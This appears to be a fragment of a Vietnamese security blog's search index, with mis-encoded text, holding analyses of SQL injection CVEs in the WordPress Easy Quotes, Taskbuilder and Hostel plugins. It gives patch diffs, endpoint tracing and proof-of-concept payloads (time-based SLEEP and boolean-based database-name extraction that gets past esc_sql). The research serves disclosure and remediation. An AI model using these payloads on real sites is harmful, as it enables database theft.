family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;2\u0026#39;\u0026#34; Äiá»u kiá»‡n AND '1'='2' luÃ´n sai =\u0026gt; query khÃ´ng khá»›p =\u0026gt; tráº£ vá» [].\nGet First Letter of Database Name Äiá»u kiá»‡n tiÃªn quyáº¿t Ä‘á»ƒ dump Ä‘Æ°á»£c háº¿t data lÃ  pháº£i dump Ä‘Æ°á»£c 1 kÃ½ tá»± báº¥t ká»³ cá»§a tÃªn database, náº¿u láº¥y Ä‘Æ°á»£c thÃ¬ toÃ n bá»™ data Ä‘á»u dump Ä‘Æ°á»£c.\nDatabase name Ä‘Æ°á»£c tÃ´i Ä‘áº·t tÃªn lÃ  wordpress nÃªn kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w {: .prompt-info }\nResponse tráº£ vá» dá»¯ liá»‡u bÃ¬nh thÆ°á»ng =\u0026gt; kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w\nKhi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+SUBSTRING(DATABASE(),1,1)=\u0026#39;w\u0026#39;\u0026#34; Automatic Extraction Dá»±a trÃªn kÄ© thuáº­t boolean base ta viáº¿t script Ä‘á»ƒ tá»± Ä‘á»™ng khai thÃ¡c.\nScript Here\nConclusion Lá»— há»•ng CVE-2025-26943 trong plugin WordPress Easy Quotes trÆ°á»›c phiÃªn báº£n 1.2.3 xuáº¥t phÃ¡t tá»« viá»‡c khÃ´ng sá»­ dá»¥ng cÆ¡ cháº¿ chuáº©n bá»‹ truy váº¥n ($wpdb-\u0026gt;prepare) mÃ  truyá»n trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u lá»‡nh SQL dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nBáº£n vÃ¡ chÃ­nh thá»©c Ä‘Ã£ thay tháº¿ viá»‡c ná»‘i chuá»—i báº±ng cÃ¡ch dÃ¹ng $wpdb-\u0026gt;prepare, giÃºp Ä‘áº£m báº£o dá»¯ liá»‡u Ä‘áº§u vÃ o Ä‘Æ°á»£c kiá»ƒm soÃ¡t vÃ  an toÃ n hÆ¡n.\nKey takeaways:\nLuÃ´n sá»­ dá»¥ng $wpdb-\u0026gt;prepare() khi lÃ m viá»‡c vá»›i database trong WordPress Ä‘á»ƒ trÃ¡nh SQL Injection. ThÆ°á»ng xuyÃªn cáº­p nháº­t plugin vÃ  kiá»ƒm tra báº£o máº­t Ä‘á»ƒ trÃ¡nh trá»Ÿ thÃ nh má»¥c tiÃªu táº¥n cÃ´ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Easy Quotes Plugin \u0026lt;= 1.2.2 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-23-cve-2025-26943/","summary":"\u003cp\u003eLá»— há»•ng xáº£y ra trÃªn plugin \u003cstrong\u003eEasy Quotes\u003c/strong\u003e cá»§a WordPress trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e1.2.3\u003c/strong\u003e. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-26943\"\u003eCVE-2025-26943\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/easy-quotes/#description\"\u003eWordPress Easy Quotes Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.2.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v1.2.2(vul) vÃ  v1.2.3(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eá»¨ng dá»¥ng Ä‘Ã£ Ä‘Æ°a trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query SQL mÃ  \u003cstrong\u003ekhÃ´ng sá»­ dá»¥ng cÃ¡c biá»‡n phÃ¡p báº£o vá»‡\u003c/strong\u003e khiáº¿n lá»— há»•ng SQL Injection xáº£y ra.\u003c/p\u003e","title":"CVE-2025-26943"},{"content":"Lá»— há»•ng xáº£y ra trÃªn plugin Taskbuilder cá»§a WordPress trÆ°á»›c phiÃªn báº£n 4.0.2. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-39569 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1(vul) vÃ  v4.0.2(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis á»¨ng dá»¥ng Ä‘Ã£ xá»­ lÃ½ dá»¯ liá»‡u Ä‘áº§u vÃ o trÆ°á»›c khi Ä‘Æ°a vÃ o cÃ¢u SQL. Tuy nhiÃªn, trong quÃ¡ trÃ¬nh xÃ¢y dá»±ng truy váº¥n, giÃ¡ trá»‹ nÃ y Ä‘Æ°á»£c chÃ¨n trá»±c tiáº¿p mÃ  khÃ´ng Ä‘Æ°á»£c bao trong dáº¥u nhÃ¡y Ä‘Æ¡n '...'. Äiá»u Ä‘Ã³ khiáº¿n káº» táº¥n cÃ´ng cÃ³ thá»ƒ chÃ¨n thÃªm cÃ¡c thÃ nh pháº§n cÃº phÃ¡p SQL há»£p lá»‡ (nhÆ° OR, AND,...) vÃ o truy váº¥n, dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file includes/admin/projects/get_users.php\nTrong phiÃªn báº£n v4.0.1, biáº¿n $proj_id sau khi escape Ä‘Æ°á»£c Ä‘Æ°a tháº³ng vÃ o cÃ¢u truy váº¥n mÃ  khÃ´ng cÃ³ dáº¥u nhÃ¡y Ä‘Æ¡n bao quanh:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); á» báº£n v4.0.2, truy váº¥n Ä‘Ã£ Ä‘Æ°á»£c Ä‘iá»u chá»‰nh báº±ng cÃ¡ch Ä‘áº·t $proj_id trong dáº¥u nhÃ¡y Ä‘Æ¡n sau khi escape:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); Báº£n vÃ¡ nÃ y Ä‘áº£m báº£o ráº±ng giÃ¡ trá»‹ $proj_id sau khi escape Ä‘Æ°á»£c coi lÃ  má»™t chuá»—i literal, khÃ´ng thá»ƒ thoÃ¡t ra khá»i dáº¥u nhÃ¡y Ä‘Æ¡n Ä‘á»ƒ chÃ¨n thÃªm cÃº phÃ¡p SQL, qua Ä‘Ã³ ngÄƒn cháº·n táº¥n cÃ´ng SQL Injection.\nHow it work? File architecture:\nCáº¥u trÃºc chung cá»§a file hiá»‡n táº¡i\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // Báº¯t Ä‘áº§u buffer Ä‘á»ƒ táº¡o ná»™i dung chÃ­nh (body) cá»§a modal ob_start(); // ... render HTML danh sÃ¡ch users $body = ob_get_clean(); // Báº¯t Ä‘áº§u buffer Ä‘á»ƒ táº¡o pháº§n footer cá»§a modal ob_start(); // ... render HTML cÃ¡c nÃºt thao tÃ¡c (Close, Save) $footer = ob_get_clean(); // Tráº£ dá»¯ liá»‡u JSON Ä‘á»ƒ frontend hiá»ƒn thá»‹ modal echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); $proj_id / $project: Láº¥y dá»¯ liá»‡u project tá»« database. ob_start() / ob_get_clean(): Ghi HTML ra buffer thay vÃ¬ xuáº¥t trá»±c tiáº¿p, giÃºp gom ná»™i dung vÃ o biáº¿n. $body / $footer: Chá»©a ná»™i dung HTML Ä‘á»™ng cá»§a modal. json_encode(): Tráº£ JSON cho client, cÃ³ kháº£ nÄƒng Ä‘Æ°á»£c sá»­ dá»¥ng trong Ajax Ä‘á»ƒ hiá»ƒn thá»‹ modal mÃ  khÃ´ng cáº§n refresh trang. File náº±m trong thÆ° má»¥c includes cho tháº¥y ráº±ng nÃ³ sáº½ Ä‘Æ°á»£c gá»i á»Ÿ 1 chá»©c nÄƒng nÃ o Ä‘Ã³ á»Ÿ nÆ¡i khÃ¡c. Äá»ƒ biáº¿t chá»©c nÄƒng nÃ o sá»­ dá»¥ng nÃ³, ta tÃ¬m kiáº¿m vá»›i tá»« khÃ³a get_users.php trong thÆ° má»¥c chá»©a plugin.\nğŸ‘‰ NÃ³ Ä‘Æ°á»£c include trong hÃ m wppm_get_users() cá»§a class WPPM_Admin trong file class-wppm-admin.php. wppm_get_users() lÃ  callback cá»§a action hook trong WordPress.\nWPPM_Admin construct:\nfinal class WPPM_Admin { // constructor public function __construct() { // other action add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;,array($this,\u0026#39;wppm_get_users\u0026#39;)); // array($this,\u0026#39;wppm_get_users\u0026#39;)) = $this::wppm_get_users() // other action } } add_action() lÃ  má»™t Plugin API cá»§a WordPress, cho phÃ©p gáº¯n má»™t callback vÃ o má»™t action hook. wp_ajax_wppm_get_users lÃ  tÃªn hook Ajax, vá»›i quy táº¯c Ä‘áº·t tÃªn: wp_ajax_{action} =\u0026gt; Xá»­ lÃ½ Ajax khi user Ä‘Ã£ Ä‘Äƒng nháº­p. wp_ajax_nopriv_{action} =\u0026gt; Xá»­ lÃ½ Ajax khi user chÆ°a Ä‘Äƒng nháº­p. á» Ä‘Ã¢y, action = wppm_get_users. NghÄ©a lÃ  náº¿u trong Ajax request báº¡n gá»­i action=wppm_get_users tá»›i admin-ajax.php, thÃ¬ WordPress sáº½ tÃ¬m callback tÆ°Æ¡ng á»©ng Ä‘á»ƒ xá»­ lÃ½, á»Ÿ Ä‘Ã¢y lÃ  wppm_get_users(). ğŸ‘‰ Ta Ä‘Ã£ biáº¿t Ä‘Æ°á»£c action = wppm_get_users, kiá»ƒm tra xem Ajax nÃ o sá»­ dá»¥ng action nÃ y báº±ng cÃ¡ch tÃ¬m tá»« khÃ³a wppm_get_users trÃªn cÃ¡c file .js trong thÆ° má»¥c chá»©a plugin.\nAction wppm_get_users lÃ  pháº§n data trong request POST cá»§a hÃ m wppm_get_users()\nHÃ m wppm_get_users() sáº½ Ä‘Æ°á»£c Ä‘áº·t trong HTML attribute cá»§a chá»©c nÄƒng project\nTáº¡o project má»›i Truy cáº­p vÃ o project Ä‘Ã³ Inspect code vÃ  tÃ¬m hÃ m wppm_get_users sáº½ Ä‘Æ°á»£c Ä‘áº·t á»Ÿ Ä‘Ã¢u, hÃ nh Ä‘á»™ng nÃ o sáº½ gá»i nÃ³ ğŸ‘‰ Khi click vÃ o icon bÃªn cáº¡nh Users ajax sáº½ hoáº¡t Ä‘á»™ng, gá»­i request Ä‘áº¿n server, láº¥y danh sÃ¡ch cÃ¡c user tham gia project vÃ  mÃ£ HTML hiá»ƒn thá»‹ nÃ³.\nExploit Detect SQLi Báº¯t request báº±ng BurpSuite, gá»­i request vá»›i SQLi payload time base\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Thá»i gian pháº£n há»“i bá»‹ delay =\u0026gt; SQL Injection thÃ nh cÃ´ng.\nGet First Letter of Database Name Äiá»u kiá»‡n tiÃªn quyáº¿t Ä‘á»ƒ dump Ä‘Æ°á»£c háº¿t data lÃ  pháº£i dump Ä‘Æ°á»£c 1 kÃ½ tá»± báº¥t ká»³ cá»§a tÃªn database, náº¿u láº¥y Ä‘Æ°á»£c thÃ¬ toÃ n bá»™ data Ä‘á»u dump Ä‘Æ°á»£c.\nGá»­i request vá»›i SQLi payload boolean base vÃ³i proj_id Ä‘Ãºng:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name Ä‘Æ°á»£c tÃ´i Ä‘áº·t tÃªn lÃ  wordpress nÃªn kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w tÆ°Æ¡ng á»©ng vá»›i mÃ£ HEX lÃ  0x77\nSá»­ dá»¥ng SUBSTRING(STRING,1,1) Ä‘á»ƒ láº¥y kÃ­ tá»± Ä‘áº§u tiÃªn cá»§a chuá»—i\ná» Ä‘Ã¢y, $proj_id báº±ng 4 vÃ¬ SUBSTRING('wordpress',1,1)=0x77 lÃ  Ä‘Ãºng nÃªn SELECT láº¥y giÃ¡ trá»‹ Ä‘Ãºng trong IF(condition, value if true, value if false), 4 lÃ  giÃ¡ trá»‹ cÃ³ thá»±c trong database, nÃªn response tráº£ vá» chá»©a danh sÃ¡ch ngÆ°á»i tham gia dá»± Ã¡n\nSá»­ dá»¥ng HEX technique Ä‘á»ƒ bypass hÃ m esc_sql() á»Ÿ trÃªn, dÃ¹ng Ä‘á»ƒ so sÃ¡nh khi khÃ´ng sá»­ dÃ¹ng Ä‘Æ°á»£c '\nGá»­i request vá»›i SQLi payload boolean base vÃ³i proj_id sai:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) Vá»›i proj_id khÃ´ng cÃ³ thá»±c trong database, response sáº½ tráº£ vá» káº¿t quáº£ chá»©a None\nğŸ‘‰ Ta Ä‘Ã£ láº¥y Ä‘Æ°á»£c kÃ­ tá»± Ä‘áº§u tiÃªn cá»§a database name báº±ng ká»¹ thuáº­t boolean base\nproj_id Ä‘Ã¹ng: response khÃ´ng chá»©a None proj_id sai: response chá»©a None CÃ³ thá»ƒ sá»­ dá»¥ng ká»¹ thuáº­t time base nhÆ°ng khi dump sá»‘ lÆ°á»£ng lá»›n data, thá»i gian dump sáº½ ráº¥t lÃ¢u\nConclusion Lá»— há»•ng CVE-2025-39569 trong plugin WordPress Taskbuilder xuáº¥t phÃ¡t tá»« viá»‡c thiáº¿u dáº¥u nhÃ¡y Ä‘Æ¡n '...' bao quanh dá»¯ liá»‡u Ä‘áº§u vÃ o trong cÃ¢u lá»‡nh SQL, khiáº¿n dá»¯ liá»‡u ngÆ°á»i dÃ¹ng cÃ³ thá»ƒ Ä‘Æ°á»£c diá»…n giáº£i nhÆ° má»™t pháº§n cá»§a cÃ¢u lá»‡nh SQL há»£p lá»‡.\nBáº£n vÃ¡ á»Ÿ phiÃªn báº£n 4.0.2 Ä‘Ã£ kháº¯c phá»¥c váº¥n Ä‘á» báº±ng cÃ¡ch Ä‘Æ°a $proj_id vÃ o trong '...', Ä‘áº£m báº£o nÃ³ luÃ´n Ä‘Æ°á»£c xá»­ lÃ½ nhÆ° má»™t literal string trong SQL.\nKey takeaways:\nÆ¯u tiÃªn sá»­ dá»¥ng prepared statements ($wpdb-\u0026gt;prepare() trong WordPress) thay vÃ¬ tá»± chÃ¨n dá»¯ liá»‡u vÃ o query. Äá»‘i vá»›i cÃ¡c plugin WordPress, cáº§n test ká»¹ lÆ°á»¡ng cÃ¡c Ajax endpoint vÃ¬ Ä‘Ã¢y lÃ  nÆ¡i dá»… xuáº¥t hiá»‡n SQLi vÃ  XSS nháº¥t. NgÆ°á»i quáº£n trá»‹ cáº§n thÆ°á»ng xuyÃªn cáº­p nháº­t plugin/theme Ä‘á»ƒ nháº­n báº£n vÃ¡ ká»‹p thá»i. References SQL Injection cheat sheet - PortSwigger\nWordPress Taskbuilder project mnagement tool Plugin \u0026lt;= 4.0.1 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-22-cve-2025-39569/","summary":"\u003cp\u003eLá»— há»•ng xáº£y ra trÃªn plugin \u003cstrong\u003eTaskbuilder\u003c/strong\u003e cá»§a WordPress trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e4.0.2\u003c/strong\u003e. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v4.0.1(vul) vÃ  v4.0.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eá»¨ng dá»¥ng Ä‘Ã£ \u003cstrong\u003exá»­ lÃ½ dá»¯ liá»‡u Ä‘áº§u vÃ o\u003c/strong\u003e trÆ°á»›c khi Ä‘Æ°a vÃ o cÃ¢u SQL. Tuy nhiÃªn, trong quÃ¡ trÃ¬nh xÃ¢y dá»±ng truy váº¥n, giÃ¡ trá»‹ nÃ y Ä‘Æ°á»£c chÃ¨n trá»±c tiáº¿p mÃ  khÃ´ng Ä‘Æ°á»£c bao trong dáº¥u nhÃ¡y Ä‘Æ¡n \u003ccode\u003e'...'\u003c/code\u003e. Äiá»u Ä‘Ã³ khiáº¿n káº» táº¥n cÃ´ng cÃ³ thá»ƒ chÃ¨n thÃªm cÃ¡c thÃ nh pháº§n cÃº phÃ¡p SQL há»£p lá»‡ (nhÆ° \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e,\u003ccode\u003e...\u003c/code\u003e) vÃ o truy váº¥n, dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\u003c/p\u003e","title":"CVE-2025-39569 Analysis \u0026 POC"},{"content":"Lá»— há»•ng trong plugin Hostel trÆ°á»›c phiÃªn báº£n 1.1.5.7. Do viá»‡c lÃ m sáº¡ch dá»¯ liá»‡u khÃ´ng Ä‘Ãºng cÃ¡ch, Ä‘iá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) vÃ  v1.1.5.7(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ thÃ¡y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis NguyÃªn nhÃ¢n cá»‘ lÃµi do á»©ng dá»¥ng chÃ¨n trá»±c tiáº¿p dá»¯ liá»‡u tá»« GET request vÃ o SQL query mÃ  cÆ¡ cháº¿ kiá»ƒm soÃ¡t khÃ´ng cháº·t cháº½.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file controllers/bookings.php\nBáº£n lá»— há»•ng:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } Báº£n vÃ¡:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } ğŸ‘‰ Báº£n vÃ¡ sá»­ dá»¥ng whitelist Ä‘á»ƒ giá»›i háº¡n cÃ¡c cá»™t cÃ³ thá»ƒ Ä‘Æ°á»£c sáº¯p xáº¿p, náº¿u khÃ´ng há»£p lá»‡ tráº£ vá» 'tB.id'.\nAnalysis: Lá»— há»•ng xuáº¥t hiá»‡n khi param ob Ä‘Æ°á»£c truyá»n trá»±c tiáº¿p vÃ o má»‡nh Ä‘á» ORDER BY thÃ´ng qua hÃ m sanitize_text_field(), chá»‰ escape mÃ  khÃ´ng filter SQLi.\nHow it work? Äá»ƒ inject Ä‘Æ°á»£c, ta cáº§n pháº£i xÃ¡c Ä‘á»‹nh toÃ n bá»™ cÃ¢u query Ä‘Æ°á»£c Ä‘Æ°á»£c sá»­ dá»¥ng á»Ÿ Ä‘Ã¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); CÃ¢u query náº±m trong nhÃ¡nh default cá»§a cáº¥u trÃºc switch.\nToÃ n bá»™ Ä‘oáº¡n xá»­ lÃ½ naá»³ thuá»™c vá» hÃ m static manage() cá»§a class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao tiáº¿p vá»›i core thÃ´ng qua Plugin API (Hook System). Do Ä‘Ã³, Ä‘á»ƒ xÃ¡c Ä‘á»‹nh nÆ¡i hÃ m manage() Ä‘Æ°á»£c gá»i, ta cÃ³ thá»ƒ tÃ¬m kiáº¿m tá»« khÃ³a \u0026quot;manage\u0026quot; trong thÆ° má»¥c chá»©a plugin.\nTrong file models/hostel.php ta cÃ³ hÃ m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); 